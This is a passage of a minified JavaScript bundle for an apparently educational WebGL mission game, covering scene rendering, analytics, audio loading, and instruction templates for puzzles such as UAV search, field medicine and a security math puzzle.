var Home=require("./sections/home"),MainMenu=require("./sections/main-menu"),Mission=require("./sections/mission"),TrainingRoom=require("./sections/training-room"),Login=require("./sections/login"),Profile=require("./sections/profile"),About=require("./sections/about"),Stars=require("./elements/stars"),Sky=require("./elements/sky"),FXHandler=require("./fx-handler"),client=require("shared/utils/client/client"),Stats=require("stats-js"),FPSChecker=require("shared/utils/fps-checker"),ATUtil=require("shared/utils/general-utils"),webGLMain,WebGLMain=function(){function e(e){m=new FPSChecker,m.init(),m.on("fps-warn",n),R=!0,H=e.$parent,G=e.sectionElements,window.location.href.indexOf("mobile")>-1&&(O=!0),v=new THREE.PerspectiveCamera(75,window.innerWidth/window.innerHeight,1,13e3),v.position.z=400,M=new THREE.Scene,x=new THREE.WebGLRenderer({preserveDrawingBuffer:-1!==window.location.search.indexOf("screenshot")}),x.setSize(window.innerWidth,window.innerHeight),y=new THREE.Object3D,M.add(y),H.append(x.domElement),M.fog=new THREE.Fog(0,2e3,3e3),S=new THREE.Scene,T=new THREE.CSS3DRenderer,T.setSize(window.innerWidth,window.innerHeight),T.domElement.style.position="absolute",T.domElement.style.top=0;var t=document.createElement("div");L=new THREE.CSS3DObject(t),S.add(L),H.append(T.domElement),p=new Stars({webGLMain:this}),p.init(),E=new Sky({webGLMain:this,parentObj:M}),E.init(),q.home=new Home({webGLMain:this,el:G.home[0]}),q.home.init(),q["main-menu"]=new MainMenu({webGLMain:this,el:G["main-menu"][0]}),q["main-menu"].init(),q.mission=new Mission({webGLMain:this,els:G.mission}),q.mission.init(),q["training-room"]=new TrainingRoom({webGLMain:this,els:G["training-room"]}),q["training-room"].init(),q.login=new Login({webGLMain:this,el:G.login[0]}),q.login.init(),q.profile=new Profile({webGLMain:this}),q.profile.init(),q.about=new About({webGLMain:this}),q.about.init(),O||(h=new FXHandler({webGLMain:this,home:q.home}),h.init()),g=new Stats,g.domElement.style.position="absolute",g.domElement.style.top="0px",F=!1,a(),r(),i(),window.location.href.indexOf("?dev")>-1&&(b=!0),b&&(H.append(g.domElement),$("body").append('<div id="debug-text"></div>'),$("#debug-text").css("zIndex",999),$("#debug-text").css("position","absolute"),$("#debug-text").css("top","100px"),$("#debug-text").css("width","200px"),$("#debug-text").css("height","50px")),console.log("client: ",client)}function n(){console.log("FPS WARN"),h&&h.disable(),O=!0}function i(){F||(window.requestAnimationFrame(i),webGLMain.trigger("update"),P+=.1,y.rotation.x+=(-z.y*k-y.rotation.x)/20,y.rotation.y+=(z.x*k-y.rotation.y)/20,L.rotation.copy(y.rotation),O&&x.render(M,v),T.render(S,v),g.update())}function t(e){R&&(console.log("webGLMain.navToSection",e),f&&f.transOut(),f=q[e],f&&f.transIn(),"training-room"===e||"mission"===e?E.fade(1,this.transTime/2,this.transTime/2):E.fade(0,this.transTime/2,0),"profile"===e?p.fade(0,this.transTime):p.fade(.5,this.transTime),"home"===e?h&&h.showRadialBlur(!0):h&&h.showRadialBlur(!1))}function o(e,n){null!==e&&(console.log("navToChallenge",e),setTimeout(function(){n()},2500),q.mission.challengeFlythrough(e))}function r(){C.w=window.innerWidth,C.h=window.innerHeight,v.aspect=C.w/C.h,v.updateProjectionMatrix(),x.setSize(C.w,C.h),T.setSize(C.w,C.h),webGLMain.trigger("resize"),W=!1}function a(){$(window).on("resize",r),$("body").on("mousemove",s),$("body").on("touchstart",c),$("body").on("touchmove",l),O&&window.DeviceMotionEvent&&$(window).on("deviceorientation",u)}function s(e){z.x=e.clientX/window.innerWidth*2-1,z.y=2*-(e.clientY/window.innerHeight)+1}function u(e){var n=10,i=1;W||(A={beta:e.originalEvent.beta,gamma:e.originalEvent.gamma},W=!0);var t=ATUtil.clamp((e.originalEvent.beta-A.beta)/n,-i,i),o=-ATUtil.clamp((e.originalEvent.gamma-A.gamma)/n,-i,i);C.w>C.h?(z.x=t,z.y=o):(z.x=o,z.y=t)}function c(e){s(e.originalEvent.touches[0])}function l(e){s(e.originalEvent.touches[0])}function d(e){H.css("cursor",e)}function w(e){$("#debug-text").text(e)}var m;this.transTime=1.5,this.positionEase=Power3.easeOut,this.rotationEase=Power3.easeOut;var h,g,b,f,p,E,v,M,x,S,T,y,L,H,G,R=!1,q={},P=0,z=new THREE.Vector2(0,0),C={},k=Math.PI/12,O="mobile"===client.device.type||"tablet"===client.device.type,F=!1,W=!1,A=0;_.extend(this,Backbone.Events),_.extend(this,{init:e,trace:w,navToSection:t,navToChallenge:o,getCSSHolder:function(){return L},getMainHolder:function(){return y},getVizTime:function(){return P},getScene:function(){return M},getCamera:function(){return v},getRenderer:function(){return x},getVizSize:function(){return C},getIsMobile:function(){return O},getStars:function(){return p},getSunPos:function(){return q.home.getSunPos()},getFXHandler:function(){return h},setBkgndCursor:d})};webGLMain=new WebGLMain,-1!==window.location.search.indexOf("screenshot")&&$(document.body).on("keydown",function(e){if(32===e.keyCode){var n=$("#webgl canvas, .webgl-tunnel canvas")[0].toDataURL();console.save(n,"screenshot_"+Date.now()+".png","image/png")}}),module.exports=webGLMain;
},{"./elements/sky":89,"./elements/stars":91,"./fx-handler":98,"./sections/about":99,"./sections/home":100,"./sections/login":101,"./sections/main-menu":102,"./sections/mission":103,"./sections/profile":104,"./sections/training-room":105,"shared/utils/client/client":217,"shared/utils/fps-checker":219,"shared/utils/general-utils":220,"stats-js":43}],107:[function(require,module,exports){
var GA_ID="UA-67738307-1";$(document).ready(function(){var e=document.createElement("div"),a=document.createElement("script");a.innerHTML="(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', '"+GA_ID+"', 'auto');",e.appendChild(a),document.body.appendChild(e)});var analytics={setUser:function(e){ga("set","&uid",e)},trackEvent:function(e,a,n,t){console.log("analytics.trackEvent",e,a,n,t),ga("send","event",e,a,n,t)},trackPage:function(e){var a=window.location.pathname+window.location.hash;console.log("analytics.trackPage",a,e),ga("send","pageview",e||a)}};module.exports=analytics;
},{}],108:[function(require,module,exports){
"use strict";var Klang=require("shared/lib/klang"),storage=require("shared/utils/storage"),client=require("shared/utils/client/client"),uiEvents=["main_rollout","main_rollover","main_click","training_rollover","sound_on","sound_off"],isAndroid=-1!==navigator.userAgent.indexOf("Android"),audioProxy={allowWebAudio:!0,initialized:!1,queuedEvents:[],loadSoundFilesFromPlan8:!1,loadGroups:["site","training","mission","game_shared","trajectory_mapping","uav_search","clear_path","field_medicine","security_bypass","intel_sweep","access_intel"],loadCount:0,init:function(o,e){if(-1!==window.location.search.indexOf("no-sound"))return void o();this.webAudioSupported=!!(this.allowWebAudio&&window.AudioContext&&window.AudioContext.prototype.createMediaElementSource),this.forceMode=!this.allowWebAudio||isAndroid?"audiotag":"";var i=this.loadSoundFilesFromPlan8?"//klangfiles.s3.amazonaws.com/uploads/projects/Jp0z8/":"//storage.googleapis.com/cryptaris/sounds/v2/fallback/",n=this.loadSoundFilesFromPlan8?"//klangfiles.s3.amazonaws.com/uploads/projects/9hwE7/":"//storage.googleapis.com/cryptaris/sounds/v2/webaudio/";Klang.init(this.webAudioSupported?n+"config.json":i+"config.json",function(i){if(i){audioProxy.initialized=!0;var n=storage.getItem("muted");if(n&&audioProxy.soundOff(),"iOS"===client.os.name&&document.addEventListener("touchend",audioProxy.initIOS),"site"===e.type)audioProxy.loadSoundGroups(["site","training","mission"],o);else if("game"===e.type){var a=e.game.replace(/[0-9]+\_/,"");audioProxy.loadSoundGroups(["game_shared",a],o)}}},function(o){},null,{forceMode:audioProxy.forceMode}),$(window).blur(this.onWindowBlur.bind(this)),$(window).focus(this.onWindowFocus.bind(this))},loadSoundGroups:function(o,e){audioProxy.loadSoundGroup(o,function(){audioProxy.webAudioSupported?(audioProxy.loadCount++,audioProxy.loadCount===o.length&&audioProxy.readyToPlay(e)):audioProxy.readyToPlay(e)})},loadAllSoundGroups:function(o){audioProxy.loadSoundGroup(audioProxy.loadGroups,function(){audioProxy.webAudioSupported?(audioProxy.loadCount++,audioProxy.loadCount===audioProxy.loadGroups.length&&audioProxy.readyToPlay(o)):audioProxy.readyToPlay(o)})},triggerQueued:function(){for(var o=0;o<audioProxy.queuedEvents.length;o++){var e=audioProxy.queuedEvents[o];audioProxy.triggerEvent.apply(this,e)}audioProxy.queuedEvents=[]},readyToPlay:function(o){o();var e=storage.getItem("muted");audioProxy.queuedEvents.length&&!e&&document.hasFocus()&&audioProxy.triggerQueued()},loadSoundGroup:function(o,e,i,n){e=e||function(){},i=i||function(){},n=n||function(){},Klang.load(o,e,i,n)},initIOS:function(){Klang.initIOS(),document.removeEventListener("touchend",this.initIOS)},onWindowBlur:function(){audioProxy.triggerEvent("sound_off")},onWindowFocus:function(){storage.getItem("muted")||(audioProxy.triggerEvent("sound_on"),audioProxy.queuedEvents.length&&audioProxy.triggerQueued())},soundOn:function(){audioProxy.triggerEvent("sound_on"),storage.removeItem("muted"),audioProxy.queuedEvents.length&&audioProxy.triggerQueued()},soundOff:function(){audioProxy.triggerEvent("sound_off"),storage.setItem("muted",!0)},UI_EVENTS:{MAIN_MENU_CLICK:{name:"main_click"},MAIN_MENU_ROLL_OVER:{name:"rollover_top",debounce:200},MAIN_MENU_ROLL_OUT:{name:"main_rollout"},STEM_LOGO_ROLL_OVER:{name:"drop_plot_point"},STEM_LOGO_ROLL_OUT:{name:"main_rollout"},LOGIN_CLICK:{name:"main_click"},LOGIN_HOVER:{name:"rollover_top"},SOCIAL_SHARE_CLICK:{name:"main_click"},SOCIAL_SHARE_HOVER:{name:"main_rollover"},TRAINING_ROOM_NAV_CLICK:{name:"main_click"},TRAINING_ROOM_NAV_HOVER:{name:"rollover_top",debounce:100},TRAINING_ROOM_GRID_HOVER:{name:"view_btn_over"},INSTRUCTIONS_CLICK:{name:"main_click"},INSTRUCTIONS_ROLL_OVER:{name:"main_rollover"},INSTRUCTIONS_CLOSE_CLICK:{name:"main_click"},GAME_1_UAV_ROLL_OVER:{name:"rollover_top"},GAME_4_FILTER_CLICK:{name:"filter_click"},GAME_4_CAM_ROTATION_CLICK:{name:"main_click"},GAME_4_CAM_ROTATION_ROLL_OVER:{name:"view_btn_over"},GAME_4_FILTER_ROLL_OVER:{name:"filter_over"},GAME_6_FILE_CLOSE:{name:"main_click"},ABOUT_CLICK:{name:"main_click"},ABOUT_ROLL_OVER:{name:"main_rollover"},LOGIN_LOGIN_ROLL_OVER:{name:"main_rollover"},LOGIN_LOGIN_CLICK:{name:"main_click"},LOGIN_CANCEL_CLICK:{name:"main_click"},LOGIN_CANCEL_ROLL_OVER:{name:"main_rollover"},PROFILE_BTN_CLICK:{name:"main_click"},PROFILE_BTN_HOVER:{name:"main_rollover"},PROFILE_LOGIN_CANCEL:{name:"main_click"}},triggerUI:function(o){if(o){if(o.debounce){var e=Date.now();if(void 0===o.timeStamp)o.timeStamp=e;else{if(e-o.timeStamp<o.debounce)return;o.timeStamp=e}}this.triggerEvent(o.name)}else console.warn("Missing UI Event")},triggerEvent:function(o){return-1===uiEvents.indexOf(o)&&audioProxy.initialized===!1?void audioProxy.queuedEvents.push(arguments):void Klang.triggerEvent(o)}};module.exports=audioProxy;
},{"shared/lib/klang":124,"shared/utils/client/client":217,"shared/utils/storage":223}],109:[function(require,module,exports){
"document"in self&&("classList"in document.createElement("_")?!function(){"use strict";var t=document.createElement("_");if(t.classList.add("c1","c2"),!t.classList.contains("c2")){var e=function(t){var e=DOMTokenList.prototype[t];DOMTokenList.prototype[t]=function(t){var n,i=arguments.length;for(n=0;i>n;n++)t=arguments[n],e.call(this,t)}};e("add"),e("remove")}if(t.classList.toggle("c3",!1),t.classList.contains("c3")){var n=DOMTokenList.prototype.toggle;DOMTokenList.prototype.toggle=function(t,e){return 1 in arguments&&!this.contains(t)==!e?e:n.call(this,t)}}t=null}():!function(t){"use strict";if("Element"in t){var e="classList",n="prototype",i=t.Element[n],s=Object,r=String[n].trim||function(){return this.replace(/^\s+|\s+$/g,"")},o=Array[n].indexOf||function(t){for(var e=0,n=this.length;n>e;e++)if(e in this&&this[e]===t)return e;return-1},a=function(t,e){this.name=t,this.code=DOMException[t],this.message=e},c=function(t,e){if(""===e)throw new a("SYNTAX_ERR","An invalid or illegal string was specified");if(/\s/.test(e))throw new a("INVALID_CHARACTER_ERR","String contains an invalid character");return o.call(t,e)},l=function(t){for(var e=r.call(t.getAttribute("class")||""),n=e?e.split(/\s+/):[],i=0,s=n.length;s>i;i++)this.push(n[i]);this._updateClassName=function(){t.setAttribute("class",this.toString())}},u=l[n]=[],f=function(){return new l(this)};if(a[n]=Error[n],u.item=function(t){return this[t]||null},u.contains=function(t){return t+="",-1!==c(this,t)},u.add=function(){var t,e=arguments,n=0,i=e.length,s=!1;do t=e[n]+"",-1===c(this,t)&&(this.push(t),s=!0);while(++n<i);s&&this._updateClassName()},u.remove=function(){var t,e,n=arguments,i=0,s=n.length,r=!1;do for(t=n[i]+"",e=c(this,t);-1!==e;)this.splice(e,1),r=!0,e=c(this,t);while(++i<s);r&&this._updateClassName()},u.toggle=function(t,e){t+="";var n=this.contains(t),i=n?e!==!0&&"remove":e!==!1&&"add";return i&&this[i](t),e===!0||e===!1?e:!n},u.toString=function(){return this.join(" ")},s.defineProperty){var h={get:f,enumerable:!0,configurable:!0};try{s.defineProperty(i,e,h)}catch(g){-2146823252===g.number&&(h.enumerable=!1,s.defineProperty(i,e,h))}}else s[n].__defineGetter__&&i.__defineGetter__(e,f)}}(self));
},{}],110:[function(require,module,exports){
!function(){for(var o=function(){},n=console,e="assert assert clear count debug dir dirxml error group groupCollapsed groupEnd info log markTimeline profile profileEnd table time timeEnd timeStamp timeline timelineEnd trace warn".split(" "),i={},l=e.length-1;l>=0;l--)i[e[l]]=o;window.__debug=function(o){o?window.console=n:window.console=i}}();var shouldConsoleLog=!0;"production"===window.env&&(shouldConsoleLog=!1),-1!==window.location.href.indexOf("debug")&&(shouldConsoleLog=!0),window.__debug(shouldConsoleLog);
},{}],111:[function(require,module,exports){
var Stub=require("shared/stub"),dataInterface=new(Backbone.Model.extend({dataStubbed:!0,url:"",initialize:function(){},getData:function(t){if(this.dataStubbed)t(Stub);else{var e=this.get("data");e?t(e):this.fetch({success:this.returnData.bind(this),error:this.handleError.bind(this)})}},getGame:function(t,e){if(this.dataStubbed){var a=_.clone(Stub.games[t]);console.log("getGame retObj",a),e(a)}else this.fetch({success:this.returnData.bind(this),error:this.handleError.bind(this)})}}));("dev"===window.env||null!==window.location.search.match("debug"))&&(window._dataInterface=dataInterface),module.exports=dataInterface;
},{"shared/stub":151}],112:[function(require,module,exports){
var FlickerTransition=function(e,n,o,t){function i(){u?("in"===e&&s.remove(),n()):setTimeout(i,f+.5)}o||(o=document.body),o.appendChild||(o=o[0]),"undefined"==typeof t&&(t=1e8);var a=100,d=Math.ceil(window.innerWidth/a),r=Math.ceil(window.innerHeight/a),s=$("<div>");s.css({position:"absolute",top:0,left:0});for(var c=d*r-1;c>=0;c--){var p=$('<div class="blackboxes-flicker">').css({position:"absolute",top:Math.floor(c/d)*a+"px",left:c%d*a+"px",backgroundColor:"black",width:a+"px",height:a+"px",zIndex:t});s.append(p)}o.appendChild(s[0]);var l=.5,f=.5,h={};"in"===e?(h={start:1,end:0},f=.7):h={start:0,end:1};var u=!1;s.find("div").each(function(e,n){var o=window.RoughEase.ease.config({strength:2,points:10});TweenLite.fromTo(n,f,{opacity:h.start},{opacity:h.end,delay:Math.random()*l,ease:o,onUpdate:function(){u=!1},onComplete:function(){u=!0}})}),setTimeout(i,f+.5)};module.exports=FlickerTransition;
},{}],113:[function(require,module,exports){
var jade=require("jade/runtime");module.exports=function(s){var n=[];return n.push('<div class="container"><div class="header"><h1>Instructions</h1><div class="line"></div><div class="close-btn btn"><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div></div><div class="content"></div></div>'),n.join("")};
},{"jade/runtime":5}],114:[function(require,module,exports){
var templates={base:require("./game-instructions.jade"),"0_trajectory_mapping":require("./instructions-trajectory-mapping.jade"),"1_uav_search":require("./instructions-uav-search.jade"),"2_clear_path":require("./instructions-clear-path.jade"),"3_field_medicine":require("./instructions-field-medicine.jade"),"4_intel_sweep":require("./instructions-intel-sweep.jade"),"5_security_bypass":require("./instructions-security-bypass.jade"),"6_access_intel":require("./instructions-access-intel.jade")},paths=require("shared/paths"),ns=require("shared/namespace"),client=require("shared/utils/client/client"),GameInstructions=Backbone.View.extend({initialize:function(e){_.extend(this,e),this.setElement(this.$el),this.$el.html(templates.base()),this.$(".content").html(templates[this.game]({client:client})),this.$(".content .img").each(function(e,i){i.style.backgroundImage='url("'+paths.IMGS+"game-instructions/"+this.game+"-"+e+'.png")'}.bind(this)),this.$(".content").perfectScrollbar({suppressScrollX:!0}),this.onResize=this.onResize.bind(this),window.addEventListener("resize",this.onResize)},enter:function(){this.$el.css({visibility:"visible"}),this.$el.removeClass("fade-out").addClass("fade-in"),this.onResize(),ns.audioProxy.triggerEvent("instructions_show")},exit:function(){this.$el.removeClass("fade-in").addClass("fade-out"),setTimeout(function(){this.$el.css({visibility:"hidden"})}.bind(this),300),ns.audioProxy.triggerEvent("instructions_hide")},onResize:function(){var e=this.$(".content"),i=0;this.$(".content .item, .content .description").each(function(){i+=$(this).outerHeight(!0)});var t=Math.min(i,e.parent().height()-80);e.css({height:t}).perfectScrollbar("update")},events:{"click .close-btn":"onClickCloseBtn"},onClickCloseBtn:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.INSTRUCTIONS_CLOSE_CLICK),this.exit()}});module.exports=GameInstructions;
},{"./game-instructions.jade":113,"./instructions-access-intel.jade":115,"./instructions-clear-path.jade":116,"./instructions-field-medicine.jade":117,"./instructions-intel-sweep.jade":118,"./instructions-security-bypass.jade":119,"./instructions-trajectory-mapping.jade":120,"./instructions-uav-search.jade":121,"shared/namespace":140,"shared/paths":141,"shared/utils/client/client":217}],115:[function(require,module,exports){
var jade=require("jade/runtime");module.exports=function(e){var t=[];return t.push('<p class="description">There are 3 levels of password and key code verification that you must solve to gain access to the intel within the satellite and learn of the intentions behind the launch.</p><p class="description">How well have you been paying attention throughout the games and stories?</p><p class="description">Did you find and save everything that sounded curious, or important?</p><p class="description">Clues are hidden everywhere, so be resourceful, thorough and creative to beat this crypto-puzzle.</p><p class="description">Also, be wary of software defense mechanisms that may exist inside the enemy system. You may have to think like a developer to stop any counter measure attacks.</p>'),t.join("")};
},{"jade/runtime":5}],116:[function(require,module,exports){
var jade=require("jade/runtime");module.exports=function(e){var i=[],t=e||{};return function(e){i.push('<p class="description">Clear the three obstacles that are blocking the road to the impact zones. Be efficient and engineer solutions that utilize your limited inventory of explosives.</p><div class="item"><div class="img"></div><p>Drag explosives to place them in strategic locations</p></div><div'+jade.attr("hidden","flagship"===e.experience?"hidden":"",!0,!1)+' class="item"><div class="img"></div><p>Use the 3 views to get a better vantage of the the blockage</p></div><div class="item"><div class="img"></div><p>Detonate the explosives once you have placed your explosives intelligently</p></div>')}.call(this,"client"in t?t.client:"undefined"!=typeof client?client:void 0),i.join("")};
},{"jade/runtime":5}],117:[function(require,module,exports){
var jade=require("jade/runtime");module.exports=function(t){var i,e=[],a=t||{};return function(t){e.push('<p class="description">Triage the most critical injuries as quickly as possible. Apply the correct treatments to injuries, bringing all patients\ninto stable condition. If a patient dies you fail the level.\n</p><div class="item"><div class="img"></div><p>'+jade.escape(null==(i=t.device.type?"Tap":"Click")?"":i)+' to select the patient you\'d like to treat</p></div><div class="item"><div class="img"></div>'),void 0===t.device.type?e.push("<p>Drag a correct treatment onto an injury to heal it</p>"):e.push("<p>Hold and Drag the correct treatment onto an injury to heal it</p>"),e.push('</div><div class="item"><div class="img"></div><p>Monitor the health of each patient and try to bring all the patients to stable condition</p></div>')}.call(this,"client"in a?a.client:"undefined"!=typeof client?client:void 0),e.join("")};
},{"jade/runtime":5}],118:[function(require,module,exports){
var jade=require("jade/runtime");module.exports=function(i){var e=[];return e.push('<p class="description">Find and report the 5 pieces of critical intel:</p><ul><li>Encryption codes</li><li>Name of the group behind the launch</li><li>Operation Code Name</li><li>Latitude Longitude Coordinates</li><li>The type of payload the launch contained</li></ul><div class="item"><div class="img"></div><p>Click on an intercepted communication to examine it</p></div><div class="item"><div class="img"></div><p>Use Google Translate to examine foreign language messages</p></div><div class="item"><div class="img"></div><p>filter the intel by searching keywords or selecting the audio, text and image options</p></div><div class="item"><div class="img"></div><p>If you submit 4 incorrect message you fail the game</p></div>'),e.join("")};
},{"jade/runtime":5}],119:[function(require,module,exports){
var jade=require("jade/runtime");module.exports=function(e){var i,t=[],s=e||{};return function(e){t.push('<p class="description">Unlock all 3 levels of the security math puzzle by connecting the adjacent integers and operators\nin order to total the specified number.\n</p><div class="item"><div class="img"></div><p>'+jade.escape(null==(i=e.device.type?"Tap":"Click")?"":i)+" adjacent sides to select, or "+jade.escape(null==(i=e.device.type?"tap":"click")?"":i)+' again to deselect</p></div><div class="item"><div class="img"></div><p>This is the number you need to solve</p></div><div class="item"><div class="img"></div><p>This records the tiles you have selected</p></div><div class="item"><div class="img"></div><p>'+jade.escape(null==(i=e.device.type?"Tap":"Click")?"":i)+" Unlock once you have totaled the specified number</p></div>")}.call(this,"client"in s?s.client:"undefined"!=typeof client?client:void 0),t.join("")};
},{"jade/runtime":5}],120:[function(require,module,exports){
var jade=require("jade/runtime");module.exports=function(e){var t,i=[],o=e||{};return function(e){void 0===e.device.type?i.push('<p class="description">Watch the payload fall towards earth and click to select the location where you think it will land.\nOr, calculate the trajectory with the provided X, Y, Z intel. Once you have placed the target on the globe,\nclick Deploy to send your troops.</p>'):i.push('<p class="description">Watch the payload fall towards earth and tap to select the location where you think it will land.\nThen click Deploy to send your troops to the impact location.\n</p>'),i.push('<div class="item"><div class="img"></div><p>Location of Rocket Explosion</p></div><div class="item"><div class="img"></div><p>Current location of falling payload</p></div><div class="item"><div class="img"></div><p>'+jade.escape(null==(t=e.device.type?"Tap":"Click")?"":t)+' on the earth to estimate where the payload will land</p></div><div class="item"><div class="img"></div><p>'+jade.escape(null==(t=e.device.type?"Tap":"Click")?"":t)+" Deploy once you have selected a location, to send your troops to the impact zone</p></div>")}.call(this,"client"in o?o.client:"undefined"!=typeof client?client:void 0),i.join("")};
},{"jade/runtime":5}],121:[function(require,module,exports){
var jade=require("jade/runtime");module.exports=function(e){var i=[];return i.push('<p class="description">Deploy your UAVs to capture imagery of the terrain, while avoiding the jamming threats or\nrunning out of fuel. Analyze the captured imagery to find the 4 impact sites, then Submit\nthem to HQ.\n</p><div class="item"><div class="img"></div><p>Drag each of the 3 UAV icons onto the terrain to direct your drones</p></div><div class="item"><div class="img"></div><p>Avoid the jamming signals, they will negatively affect your score and down your drones</p></div><div class="item"><div class="img"></div><p>Keep an eye on your fuel supply and return your drone to the base to refuel</p></div><div class="item"><div class="img"></div><p>Drag the terrain to rotate your view</p></div><div class="item"><div class="img"></div><p>An image that has been captured by a drone</p></div><div class="item"><div class="img"></div><p>Use Thermal or Spectral scabs to Analyze the images. Try to find the hotspots that reveal the 4 impact zones</p></div><div class="item"><div class="img"></div><p>Analyze the images for hotspots. When you find something suspicious, Submit to HQ.</p></div>'),i.join("")};
},{"jade/runtime":5}],122:[function(require,module,exports){
THREE.Curves={},THREE.Curves.GrannyKnot=THREE.Curve.create(function(){},function(t){t=2*Math.PI*t;var a=-.22*Math.cos(t)-1.28*Math.sin(t)-.44*Math.cos(3*t)-.78*Math.sin(3*t),e=-.1*Math.cos(2*t)-.27*Math.sin(2*t)+.38*Math.cos(4*t)+.46*Math.sin(4*t),c=.7*Math.cos(3*t)-.4*Math.sin(3*t);return new THREE.Vector3(a,e,c).multiplyScalar(20)}),THREE.Curves.HeartCurve=THREE.Curve.create(function(t){this.scale=void 0===t?5:t},function(t){t*=2*Math.PI;var a=16*Math.pow(Math.sin(t),3),e=13*Math.cos(t)-5*Math.cos(2*t)-2*Math.cos(3*t)-Math.cos(4*t),c=0;return new THREE.Vector3(a,e,c).multiplyScalar(this.scale)}),THREE.Curves.VivianiCurve=THREE.Curve.create(function(t){this.radius=t},function(t){t=4*t*Math.PI;var a=this.radius/2,e=a*(1+Math.cos(t)),c=a*Math.sin(t),r=2*a*Math.sin(t/2);return new THREE.Vector3(e,c,r)}),THREE.Curves.KnotCurve=THREE.Curve.create(function(){},function(t){t*=2*Math.PI;var a=10,e=50,c=e*Math.sin(t),r=Math.cos(t)*(a+e*Math.cos(t)),s=Math.sin(t)*(a+e*Math.cos(t));return new THREE.Vector3(c,r,s)}),THREE.Curves.HelixCurve=THREE.Curve.create(function(){},function(t){var a=30,e=150,c=2*Math.PI*t*e/30,r=Math.cos(c)*a,s=Math.sin(c)*a,o=e*t;return new THREE.Vector3(r,s,o)}),THREE.Curves.TrefoilKnot=THREE.Curve.create(function(t){this.scale=void 0===t?10:t},function(t){t*=2*Math.PI;var a=(2+Math.cos(3*t))*Math.cos(2*t),e=(2+Math.cos(3*t))*Math.sin(2*t),c=Math.sin(3*t);return new THREE.Vector3(a,e,c).multiplyScalar(this.scale)}),THREE.Curves.TorusKnot=THREE.Curve.create(function(t){this.scale=void 0===t?10:t},function(t){var a=3,e=4;t*=2*Math.PI;var c=(2+Math.cos(e*t))*Math.cos(a*t),r=(2+Math.cos(e*t))*Math.sin(a*t),s=Math.sin(e*t);return new THREE.Vector3(c,r,s).multiplyScalar(this.scale)}),THREE.Curves.CinquefoilKnot=THREE.Curve.create(function(t){this.scale=void 0===t?10:t},function(t){var a=2,e=5;t*=2*Math.PI;var c=(2+Math.cos(e*t))*Math.cos(a*t),r=(2+Math.cos(e*t))*Math.sin(a*t),s=Math.sin(e*t);return new THREE.Vector3(c,r,s).multiplyScalar(this.scale)}),THREE.Curves.TrefoilPolynomialKnot=THREE.Curve.create(function(t){this.scale=void 0===t?10:t},function(t){t=4*t-2;var a=Math.pow(t,3)-3*t,e=Math.pow(t,4)-4*t*t,c=.2*Math.pow(t,5)-2*t;return new THREE.Vector3(a,e,c).multiplyScalar(this.scale)});var scaleTo=function(t,a,e){var c=a-t;return e*c+t};THREE.Curves.FigureEightPolynomialKnot=THREE.Curve.create(function(t){this.scale=void 0===t?1:t},function(t){t=scaleTo(-4,4,t);var a=.4*t*(t*t-7)*(t*t-10),e=Math.pow(t,4)-13*t*t,c=.1*t*(t*t-4)*(t*t-9)*(t*t-12);return new THREE.Vector3(a,e,c).multiplyScalar(this.scale)}),THREE.Curves.DecoratedTorusKnot4a=THREE.Curve.create(function(t){this.scale=void 0===t?40:t},function(t){t*=2*Math.PI;var a=Math.cos(2*t)*(1+.6*(Math.cos(5*t)+.75*Math.cos(10*t))),e=Math.sin(2*t)*(1+.6*(Math.cos(5*t)+.75*Math.cos(10*t))),c=.35*Math.sin(5*t);return new THREE.Vector3(a,e,c).multiplyScalar(this.scale)}),THREE.Curves.DecoratedTorusKnot4b=THREE.Curve.create(function(t){this.scale=void 0===t?40:t},function(t){var a=t*Math.PI*2,e=Math.cos(2*a)*(1+.45*Math.cos(3*a)+.4*Math.cos(9*a)),c=Math.sin(2*a)*(1+.45*Math.cos(3*a)+.4*Math.cos(9*a)),r=.2*Math.sin(9*a);return new THREE.Vector3(e,c,r).multiplyScalar(this.scale)}),THREE.Curves.DecoratedTorusKnot5a=THREE.Curve.create(function(t){this.scale=void 0===t?40:t},function(t){var a=t*Math.PI*2,e=Math.cos(3*a)*(1+.3*Math.cos(5*a)+.5*Math.cos(10*a)),c=Math.sin(3*a)*(1+.3*Math.cos(5*a)+.5*Math.cos(10*a)),r=.2*Math.sin(20*a);return new THREE.Vector3(e,c,r).multiplyScalar(this.scale)}),THREE.Curves.DecoratedTorusKnot5c=THREE.Curve.create(function(t){this.scale=void 0===t?40:t},function(t){var a=t*Math.PI*2,e=Math.cos(4*a)*(1+.5*(Math.cos(5*a)+.4*Math.cos(20*a))),c=Math.sin(4*a)*(1+.5*(Math.cos(5*a)+.4*Math.cos(20*a))),r=.35*Math.sin(15*a);return new THREE.Vector3(e,c,r).multiplyScalar(this.scale)});
},{}],123:[function(require,module,exports){
